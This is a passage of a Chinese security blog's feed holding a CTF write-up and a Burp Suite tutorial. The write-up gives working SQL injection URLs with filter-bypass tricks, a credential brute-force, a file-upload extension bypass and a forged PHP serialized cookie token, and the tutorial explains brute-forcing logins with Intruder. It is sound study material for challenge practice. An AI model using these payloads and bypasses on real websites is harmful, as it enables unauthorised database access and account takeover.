class="line">http:&#x2F;&#x2F;40de7769ffb54dc184655e6940d6e0fc0b1a530ddb0f468f.game.ichunqiu.com&#x2F;index.php?id&#x3D;1 uni&lt;&gt;on se&lt;&gt;lect 1,group_concat(table_name),3 from info&lt;&gt;rmation_schema.tables where table_schema&#x3D;&#39;sqli&#39;</span><br><span class="line">表：info</span><br></pre></td></tr></table></figure><p><img src="/2018/09/06/i%E6%98%A5%E7%A7%8BCTF/38.png" alt><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">获取列名：</span><br><span class="line">http:&#x2F;&#x2F;40de7769ffb54dc184655e6940d6e0fc0b1a530ddb0f468f.game.ichunqiu.com&#x2F;index.php?id&#x3D;1 uni&lt;&gt;on se&lt;&gt;lect 1,group_concat(column_name),3 from info&lt;&gt;rmation_schema.columns where table_name&#x3D;&#39;info&#39;</span><br><span class="line">列：id,title,flAg_T5ZNdrm</span><br></pre></td></tr></table></figure><br><img src="/2018/09/06/i%E6%98%A5%E7%A7%8BCTF/39.png" alt><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">获取字段：</span><br><span class="line">http:&#x2F;&#x2F;40de7769ffb54dc184655e6940d6e0fc0b1a530ddb0f468f.game.ichunqiu.com&#x2F;index.php?id&#x3D;1 uni&lt;&gt;on se&lt;&gt;lect 1,group_concat(id,title,flAg_T5ZNdrm),3 from info</span><br></pre></td></tr></table></figure></p><p><img src="/2018/09/06/i%E6%98%A5%E7%A7%8BCTF/40.png" alt><br>    字段：<br>    id:1,2<br>    title:flag{在数据库中},test<br>    flAg_T5ZNdrm:flag{6628cc6e-8930-4dd2-b1cc-a0835365010b},test</p><h3 id="12-SQLi"><a href="#12-SQLi" class="headerlink" title="12.SQLi"></a>12.SQLi</h3><blockquote><p>题目内容：后台有获取flag的线索 </p></blockquote><p>拿到题目后是一个空白页面，查看源代码发现有个提示：<code>&lt;!-- login.php?id=1 --&gt;</code><br>访问之后测试了各种方法发现并不能注入，然后查看源代码也没有提示，请求头也没有东西，这时候要么就是有隐藏的后台，要么就是页面发生了跳转，利用扫描器扫了很长时间也没找到后台，那可能就是重定向了，我们查看页面的流量监测，然后访问<br><code>http://aaa52ea761d944cea3b2d9a344d85f80920033eeae534f39.game.ichunqiu.com/index.php</code><br>这时候可以看到总共访问了两个网页<br><img src="/2018/09/06/i%E6%98%A5%E7%A7%8BCTF/41.png" alt><br>其中一个就是302跳转，我们查看一下这个302的响应头：<br><img src="/2018/09/06/i%E6%98%A5%E7%A7%8BCTF/42.png" alt></p><p>在它里面发现了这个东西<code>l0gin.php?id=1</code><br>估计真正的注入网站是这个<br>我们先访问一下<code>http://aaa52ea761d944cea3b2d9a344d85f80920033eeae534f39.game.ichunqiu.com/l0gin.php?id=1</code><br><img src="/2018/09/06/i%E6%98%A5%E7%A7%8BCTF/43.png" alt><br>页面返回了查询的内容，直接上sqlmap跑<br><img src="/2018/09/06/i%E6%98%A5%E7%A7%8BCTF/44.png" alt><br>返回了这个东西，发现是可以注入的，但是让它继续跑却跑不出来了，那就手工注入吧</p><p>多次测试后发现<code>，</code>后边的东西被过滤掉了，那就不能用逗号了，这里直接脑补一个不用逗号也可以注入的SQL语句（Join)<br>    <code>id=-1&#39; union select * from (select group_concat(distinct(table_schema)) from information_schema.tables ) a join (select version() ) b %23</code></p><p>然后开始查询我们要的东西了：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">查询数据库：</span><br><span class="line">http:&#x2F;&#x2F;aaa52ea761d944cea3b2d9a344d85f80920033eeae534f39.game.ichunqiu.com&#x2F;l0gin.php?id&#x3D;-1&#39; union select * from (select group_concat(distinct(table_schema)) from information_schema.tables ) a join (select database() ) b %23</span><br></pre></td></tr></table></figure><p><img src="/2018/09/06/i%E6%98%A5%E7%A7%8BCTF/45.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">查询表：</span><br><span class="line">http:&#x2F;&#x2F;aaa52ea761d944cea3b2d9a344d85f80920033eeae534f39.game.ichunqiu.com&#x2F;l0gin.php?id&#x3D;-1&#39; union select * from (select group_concat(distinct(table_schema)) from information_schema.tables ) a join (select group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;sqli&#39; ) b %23</span><br></pre></td></tr></table></figure><p><img src="/2018/09/06/i%E6%98%A5%E7%A7%8BCTF/46.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">查询列：</span><br><span class="line">http:&#x2F;&#x2F;aaa52ea761d944cea3b2d9a344d85f80920033eeae534f39.game.ichunqiu.com&#x2F;l0gin.php?id&#x3D;-1&#39; union select * from (select group_concat(distinct(table_schema)) from information_schema.tables ) a join (select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39; ) b %23</span><br></pre></td></tr></table></figure><p><img src="/2018/09/06/i%E6%98%A5%E7%A7%8BCTF/47.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">查询字段：</span><br><span class="line">http:&#x2F;&#x2F;aaa52ea761d944cea3b2d9a344d85f80920033eeae534f39.game.ichunqiu.com&#x2F;l0gin.php?id&#x3D;-1&#39; union select * from (select group_concat(distinct(table_schema)) from information_schema.tables ) a join (select group_concat(flag_9c861b688330) from users ) b %23</span><br></pre></td></tr></table></figure><p><img src="/2018/09/06/i%E6%98%A5%E7%A7%8BCTF/48.png" alt></p><p>然后就得到了flag</p><h3 id="13-123"><a href="#13-123" class="headerlink" title="13.123"></a>13.123</h3><blockquote><p>题目内容：12341234，然后就解开了<br>分值：50分 类型：Web</p></blockquote><p>打开网址，查看网页源代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset&#x3D;&quot;utf-8&quot; &#x2F;&gt;</span><br><span class="line">    &lt;title&gt;会员登录&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;center&gt;</span><br><span class="line">    &lt;h4&gt;请输入帐号密码进行登录&lt;&#x2F;h4&gt;</span><br><span class="line">    &lt;form action&#x3D;&quot;&quot; method&#x3D;&quot;POST&quot;&gt;</span><br><span class="line">        &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;username&quot; placeholder&#x3D;&#39;用户名&#39; &#x2F;&gt;</span><br><span class="line">        &lt;br &#x2F;&gt;&lt;br &#x2F;&gt;</span><br><span class="line">        &lt;input type&#x3D;&quot;password&quot; name&#x3D;&quot;password&quot; placeholder&#x3D;&#39;密码&#39; &#x2F;&gt;</span><br><span class="line">        &lt;br &#x2F;&gt; &lt;br &#x2F;&gt;</span><br><span class="line">        &lt;input type&#x3D;&quot;submit&quot; name&#x3D;&quot;submit&quot; value&#x3D;&quot;登录&quot; &#x2F;&gt;</span><br><span class="line"></span><br><span class="line">        &lt;!-- 用户信息都在user.php里 --&gt;</span><br><span class="line">        &lt;!-- 用户默认默认密码为用户名+出生日期 例如:zhangwei1999 --&gt;</span><br><span class="line">    &lt;&#x2F;form&gt;</span><br><span class="line">&lt;&#x2F;center&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br><span class="line">&lt;br &#x2F;&gt;&lt;br &#x2F;&gt;&lt;center&gt;</span><br></pre></td></tr></table></figure><p>重要的是这两句：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 用户信息都在user.php里 --&gt;</span><br><span class="line">&lt;!-- 用户默认默认密码为用户名+出生日期 例如:zhangwei1999 --&gt;</span><br></pre></td></tr></table></figure></p><p>查看<code>user.php</code>是空的，那就看一下<code>user.php.bak</code> ，发现可以下载下来，那么下载到本地我们看一下<br><img src="/2018/09/06/i%E6%98%A5%E7%A7%8BCTF/49.png" alt><br>是所有的用户名，再加上给的提示 默认密码是用户名+出生日期  那么很明显了 这道题要用爆破，我们抓个包<br><img src="/2018/09/06/i%E6%98%A5%E7%A7%8BCTF/50.png" alt><br>注意上边的<code>Attack type</code>，这个要选择我选的这个，意思是两个参数一起爆破<br><code>密码用姓名+1990，这个没办法只能试出来</code><br>通过爆破的结果可以看到有一个账户是<code>lixiuyun lixiuyun1990</code><br><img src="/2018/09/06/i%E6%98%A5%E7%A7%8BCTF/51.png" alt><br>那么登陆上去，是空的，查看源代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset&#x3D;&quot;utf-8&quot; &#x2F;&gt;</span><br><span class="line">    &lt;title&gt;个人中心&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;center&gt;</span><br><span class="line">&lt;!-- 存在漏洞需要去掉  --&gt;</span><br><span class="line">&lt;!-- &lt;form action&#x3D;&quot;&quot; method&#x3D;&quot;POST&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot;&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;file&quot; &#x2F;&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;submit&quot; name&#x3D;&quot;submit&quot; value&#x3D;&quot;上传&quot; &#x2F;&gt;</span><br><span class="line">&lt;&#x2F;form&gt; --&gt;</span><br><span class="line">&lt;&#x2F;center&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure></p><p>注释里的东西是文件上传，那么我们只能在本地搭建一个这样的环境做测试<br>在本地弄一个1.php的文件，代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset&#x3D;&quot;utf-8&quot; &#x2F;&gt;</span><br><span class="line">    &lt;title&gt;个人中心&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;center&gt;</span><br><span class="line">&lt;!-- 存在漏洞需要去掉  --&gt;</span><br><span class="line">&lt;!-- &lt;form action&#x3D;&quot;http:&#x2F;&#x2F;026c6f6870ec4ba2a443e1487cf09eca89966db584ff4053.game.ichunqiu.com&#x2F;&quot; method&#x3D;&quot;POST&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot;&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;file&quot; &#x2F;&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;submit&quot; name&#x3D;&quot;submit&quot; value&#x3D;&quot;上传&quot; &#x2F;&gt;</span><br><span class="line">&lt;&#x2F;form&gt; --&gt;</span><br><span class="line">&lt;&#x2F;center&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><br>注意 form action要填写你的i春秋上边的题目地址</p><p>然后我们上传，其实就是一般的文件上传，我么上传一个图片，把后缀改成<code>.pht</code>就可以了<br>上传成功后会看到这个东西<br><img src="/2018/09/06/i%E6%98%A5%E7%A7%8BCTF/52.png" alt><br>那么直接在本地的环境上访问<code>http://026c6f6870ec4ba2a443e1487cf09eca89966db584ff4053.game.ichunqiu.com/view.php</code><br>出来一个超链接，点开是<code>file?</code><br>那么应该就很明显了，我们直接查看<code>url/view.php?file=flag</code><br>页面返回<code>filter &quot;flag&quot;</code><br>应该是过滤了<code>flag</code><br>那么用双写来绕过过滤<br><code>url/view.php?file=flaflagg</code><br>这样就看到了flag<br><img src="/2018/09/06/i%E6%98%A5%E7%A7%8BCTF/53.png" alt></p><h3 id="14-Login"><a href="#14-Login" class="headerlink" title="14.Login"></a>14.Login</h3><blockquote><p>题目名称：Login<br>题目内容：加油，我看好你</p></blockquote><p>首先进入题目，一个登陆框，需要输入账号密码</p><p><img src="/2018/09/06/i%E6%98%A5%E7%A7%8BCTF/54.png" alt></p><p>查看源代码：猛一看没啥有用的东西，其实往下拉一拉会看到好东西<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--  test1 test1  --&gt;</span><br></pre></td></tr></table></figure><br><img src="/2018/09/06/i%E6%98%A5%E7%A7%8BCTF/55.png" alt></p><p>那么就登陆吧：用户名和密码已经给了</p><p>登陆之后页面自动跳转了：<br>    <a href="http://ca965ed9a1e142e4a7d95044336b258107b780911e6f40b0.game.ichunqiu.com/member.php" target="_blank" rel="noopener">http://ca965ed9a1e142e4a7d95044336b258107b780911e6f40b0.game.ichunqiu.com/member.php</a><br>跳转到了这个页面，里面没啥东西</p><p><img src="/2018/09/06/i%E6%98%A5%E7%A7%8BCTF/56.png" alt></p><p>查看源代码也没有<br>看一下响应头，发现了一个参数：<code>show:0</code></p><p><img src="/2018/09/06/i%E6%98%A5%E7%A7%8BCTF/57.png" alt></p><p>然后就抓包改包呗：<br>我们在包里随便找个地方加上这个参数：<code>show:1</code><br>然后发包会看到页面把源代码给我们返回了过来<br><img src="/2018/09/06/i%E6%98%A5%E7%A7%8BCTF/58.png" alt><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &#39;common.php&#39;;</span><br><span class="line">$requset &#x3D; array_merge($_GET, $_POST, $_SESSION, $_COOKIE);</span><br><span class="line">class db</span><br><span class="line">&#123;</span><br><span class="line">public $where;</span><br><span class="line">function __wakeup()</span><br><span class="line">&#123;</span><br><span class="line">if(!empty($this-&gt;where))</span><br><span class="line">&#123;</span><br><span class="line">$this-&gt;select($this-&gt;where);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function select($where)</span><br><span class="line">&#123;</span><br><span class="line">$sql &#x3D; mysql_query(&#39;select * from user where &#39;.$where);</span><br><span class="line">return @mysql_fetch_array($sql);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($requset[&#39;token&#39;]))</span><br><span class="line">&#123;</span><br><span class="line">$login &#x3D; unserialize(gzuncompress(base64_decode($requset[&#39;token&#39;])));</span><br><span class="line">$db &#x3D; new db();</span><br><span class="line">$row &#x3D; $db-&gt;select(&#39;user&#x3D;\&#39;&#39;.mysql_real_escape_string($login[&#39;user&#39;]).&#39;\&#39;&#39;);</span><br><span class="line">if($login[&#39;user&#39;] &#x3D;&#x3D;&#x3D; &#39;ichunqiu&#39;)</span><br><span class="line">&#123;</span><br><span class="line">echo $flag;</span><br><span class="line">&#125;else if($row[&#39;pass&#39;] !&#x3D;&#x3D; $login[&#39;pass&#39;])&#123;</span><br><span class="line">echo &#39;unserialize injection!!&#39;;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">echo &quot;乱码&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">header(&#39;Location: index.php?error&#x3D;1&#39;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><br>然后就是代码审计了，从代码中可以看到：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">需要满足 $login[&#39;user&#39;] &#x3D;&#x3D;&#x3D; &#39;ichunqiu&#39;</span><br><span class="line">而user被$login &#x3D; unserialize(gzuncompress(base64_decode($requset[&#39;token&#39;])));处理过</span><br></pre></td></tr></table></figure><br>那么就给他反过来执行一遍：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a &#x3D; array(&quot;user&quot; &#x3D;&gt; &quot;ichunqiu&quot;);</span><br><span class="line">$a &#x3D; base64_encode(gzcompress(serialize($a)));</span><br><span class="line">echo $a;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><br>得到了一串base64编码：<code>eJxLtDK0qi62MrFSKi1OLVKyLraysFLKTM4ozSvMLFWyrgUAo4oKXA==</code></p><p>然后我们在Cookie中加上token参数，将它放进去</p><p><img src="/2018/09/06/i%E6%98%A5%E7%A7%8BCTF/59.png" alt><br>得到flag</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;WEB&quot;&gt;&lt;a href=&quot;#WEB&quot; class=&quot;headerlink&quot; title=&quot;WEB&quot;&gt;&lt;/a&gt;WEB&lt;/h2&gt;&lt;h3 id=&quot;1-broken&quot;&gt;&lt;a href=&quot;#1-broken&quot; class=&quot;headerlink&quot; title=&quot;1. broken&quot;&gt;&lt;/a&gt;1. broken&lt;/h3&gt;&lt;p&gt;题目链接：&lt;a href=&quot;http://106.75.72.168:1111/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot; title=&quot;broken&quot;&gt;http://106.75.72.168:1111/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;进入链接看到一串代码，目测是jsfuck。&lt;/p&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="http://black0saturday.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>渗透测试神器burpsuite</title>
    <link href="http://black0saturday.github.io/2018/09/06/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%A5%9E%E5%99%A8burpsuite/"/>
    <id>http://black0saturday.github.io/2018/09/06/渗透测试神器burpsuite/</id>
    <published>2018-09-06T09:13:55.000Z</published>
    <updated>2020-04-01T09:03:39.296Z</updated>
    
    <content type="html"><![CDATA[<p>burpsuite用了两年了，问了一下身边的同学有的还不知道各个模块有哪些功能，这里就详细的给大家介绍一下各个模块的功能。</p><p>burpsuite可以说是渗透测试中的神兵利器，我当初入坑的第一节就是学的burpsuite，在渗透测试中可以说是必不可少的一部分，这里会从各个模块来介绍burpsuite的几大功能。有什么错误也希望走过路过的大佬们指出，由于是说基本用法所以比较基础，各种大佬大神可以绕过啦哈哈。</p><a id="more"></a><h3 id="1-target"><a href="#1-target" class="headerlink" title="1. target"></a>1. target</h3><p>Burp的Target组件主要由站点地图、目标域组成，他们帮助渗透测试人员更好地了解目标应用的整体状况、当前的工作涉及哪些目标域、分析可能存在的攻击面等信息，Target会显示出访问过的、以及页面中有的链接URL。黑色的说明是有真正发生过通信过程的，灰色的只是爬网爬出的，没有真实访问。<br>下面我们就分别来看看Burp Target的两个组成部分。</p><p>SiteMap会在目标中以树形和表形式显示，并且还可以查看完整的请求和响应。可以看到该页面下的地址，目录，文件和参数化请求的URL，还可以扩大有趣的分支看到进一步的细节。如果选择树的一个或多个部分，在所有子分支所选择的项目都显示在表视图。<br><img src="/2018/09/06/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%A5%9E%E5%99%A8burpsuite/1.png" alt></p><p>这样看起来site map是不是很乱，可以右击add to scope，然后点击Filter勾选Show only in-scope items<br><img src="/2018/09/06/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%A5%9E%E5%99%A8burpsuite/2.png" alt><br><img src="/2018/09/06/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%A5%9E%E5%99%A8burpsuite/3.jpg" alt></p><p>此时你再回头看Site map就只有百度一个地址了，这里filter可以过滤一些参数，show all显示全部，hide隐藏所有，如果勾选了表示不过滤。<br><img src="/2018/09/06/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%A5%9E%E5%99%A8burpsuite/5.png" alt></p><h3 id="2-Proxy"><a href="#2-Proxy" class="headerlink" title="2. Proxy"></a>2. Proxy</h3><p>这个可能我们用的就比较多了，一般在渗透网站的时候会用它来截取流量包，可以看到客户端发送到服务器的各种信息，也可以直接在里面修改我们的请求头。当然用的时候需要在浏览器上开一个代理，代理的IP地址和端口号需要和Burpsuite里面的保持一致</p><p>其中的功能</p><pre><code>Intercept – 用于显示和修改Http请求和相应    forward：当你编辑之后，发送信息到服务器或浏览器    Drop：当你不想发送这次信息可以点击drop放弃这个信息    interceptionis on/off: 这个按钮用来打开和关闭所有拦截    Action：说明一个菜单可用的动作行为操作可以有哪些操作功能HTTP history – 记录设置代理后浏览器访问的页面数据包，详细记录数据包的host、method、url、status、extension等等,当我们选中某个请求时，可以看他的请求包信息，同样也可查看他的响应包信息options – 该选项主要用于设置代理监听、请求和响应，拦截反应等等。    license server:用于设置代理的IP地址和端口号，需要和浏览器设置的保持一致    Intercept Client Requests – 配置拦截规则，设置拦截数据包的匹配规则。规则可以是域名、IP、协议、HTTP方法、URL等等    Intercept Server Responses – 配置拦截规则，设置拦截的匹配规则，基于服务器端的返回情况进行匹配</code></pre><h3 id="3-Spider"><a href="#3-Spider" class="headerlink" title="3. Spider"></a>3. Spider</h3><p>BurpSuite的spider功能是用来抓取Web应用程序的链接和内容等。通过跟踪HTML和JavaScript以及提交的表单中的超链接来映射目标应用程序，它还使用了一些其他的线索，如目录列表，资源类型的注释，以及robots.txt 文件。结果会在站点地图中以树和表的形式显示出来，提供了一个清楚并非常详细的目标应用程序视图。<br>我的理解是Spider把与我们输入的网页相关的网页都找出来了。那如何使用呢？<br>比如拿<em><a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a></em>为例子，右键点击，选择send to spider。<br>然后我们回到target标签，我们看到关于<a href="http://www.baidu.com的一些目录和页面被我们扫描出来了。" target="_blank" rel="noopener">www.baidu.com的一些目录和页面被我们扫描出来了。</a><br><img src="/2018/09/06/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%A5%9E%E5%99%A8burpsuite/4.png" alt></p><h3 id="4-Scanner"><a href="#4-Scanner" class="headerlink" title="4. Scanner"></a>4. Scanner</h3><p>Burp Scanner 是一个进行自动发现 web 应用程序的安全漏洞的工具。它是为渗透测试人员设计的，并且它和你现有的手动执行进行的 web 应用程序半自动渗透测试的技术方法很相似。我们可以使用Burp Scanner代替我们手工去对系统进行普通漏洞类型的渗透测试，从而能使得我们把更多的精力放在那些必须要人工去验证的漏洞上。</p><p>使用的大多数的 web 扫描器都是单独运行的，比如你提供了一个开始的地址并开始扫描，然后注视着进度条的更新直到扫描结束，最后产生一个报告。Burp Scanner 和这完全不同，在攻击一个应用程序时它和你执行的操作紧紧的结合在一起。让你细微控制着每一个扫描的请求，并直接反馈回结果。</p><p>用法：<br>在Target右键可以选择对站点主动扫描还是被动扫描</p><p><img src="/2018/09/06/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%A5%9E%E5%99%A8burpsuite/1.jpg" alt></p><p>然后开始设置扫描规则</p><p><img src="/2018/09/06/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%A5%9E%E5%99%A8burpsuite/2.jpg" alt></p><p>Scanner主页面，不希望继续扫描的url可以在Scan queue对目标右键Cancel取消。</p><p><img src="/2018/09/06/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%A5%9E%E5%99%A8burpsuite/3.jpg" alt></p><p>然后扫描结果如下：</p><p><img src="/2018/09/06/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%A5%9E%E5%99%A8burpsuite/4.png" alt></p><h3 id="5-Intruder"><a href="#5-Intruder" class="headerlink" title="5. Intruder"></a>5. Intruder</h3><p>暴力破解模块，这个模块用的也是比较多的，暴力破解大家应该都知道，假如我要登陆一个网站，知道用户名却不知道密码，而这个网站也没有设置验证码，这时候就可以利用暴力破解从字典里一个一个试，把密码试出来。<br>首先利用proxy抓包，然后右键点击，选择send to intruder</p><p><img src="/2018/09/06/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%A5%9E%E5%99%A8burpsuite/8.png" alt></p><p>然后我们打开intruder模块，这个模块下总共有4个选项</p><p>Target</p><p><img src="/2018/09/06/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%A5%9E%E5%99%A8burpsuite/9.png" alt></p><p>target可以设置攻击目标的信息，设置Host,端口，是否使用https</p><p>Positions</p><p>Positions里面就是我们发送的包的内容</p><p><img src="/2018/09/06/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%A5%9E%E5%99%A8burpsuite/5.jpg" alt></p><p>定义的变量就是我们要暴力破解的内容</p><p>然后添加进去我们暴力破解需要用的字典，burpsuite里面有自带的字典，当然你也可以自己导入字典，这个在Payloads里面。</p><p><img src="/2018/09/06/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%A5%9E%E5%99%A8burpsuite/11.png" alt></p><p>然后可以在options里面选择线程之类的设置</p><p>设置好了之后左上角有个Intruder选项，选项下有个start attack</p><p><img src="/2018/09/06/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%A5%9E%E5%99%A8burpsuite/6.jpg" alt></p><p>开始破解之后可以看到burpsuite对网站访问的记录，请求头和响应头都可以看到，基本上返回登陆失败的字节大小都是一样的，而登陆成功的字节是不一样的，所以我们可以看一下每次访问的字节大小，如果和别的不一样，有可能就是登陆成功了，我们就可以看一看它的请求头里的密码。</p><h3 id="6-Repeater"><a href="#6-Repeater" class="headerlink" title="6. Repeater"></a>6. Repeater</h3><p>顾名思义，Repeater就是重复的意思，当我们需要修改包的信息但是不太清楚需要改成什么，这时候我们可能要一次一次的尝试，而每次尝试都需要重新抓一下包的话显然太麻烦。这时候我们就有了Repeater模块，左边是提交的信息，右边是回应的信息，当我们每次在左边修改了包的信息后，就可以点击GO按钮，这时burpsuite就会对网站发起请求，当我们需要再次修改就可以直接在左边修改然后点击GO。</p><p><img src="/2018/09/06/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%A5%9E%E5%99%A8burpsuite/12.png" alt></p><h3 id="7-Decoder"><a href="#7-Decoder" class="headerlink" title="7. Decoder"></a>7. Decoder</h3><p>Decoder模块是用来对数据进行加密解密的，当我们抓包遇到了一串密文，可以选中这串秘闻，然后直接右键选择send to decoder</p><p><img src="/2018/09/06/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%A5%9E%E5%99%A8burpsuite/20.png" alt></p><p>然后进入decoder模块，在里面可以看到各种编码方式，可以对数据进行加密解密。</p><p><img src="/2018/09/06/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%A5%9E%E5%99%A8burpsuite/21.png" alt></p><p>感谢大家的阅读，本来想全部写完的，但是写到后边发现有点多还是分为上下篇吧。上篇的内容就先写到这里，有什么不对的地方欢迎各位指教，之后会写出下篇。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;burpsuite用了两年了，问了一下身边的同学有的还不知道各个模块有哪些功能，这里就详细的给大家介绍一下各个模块的功能。&lt;/p&gt;
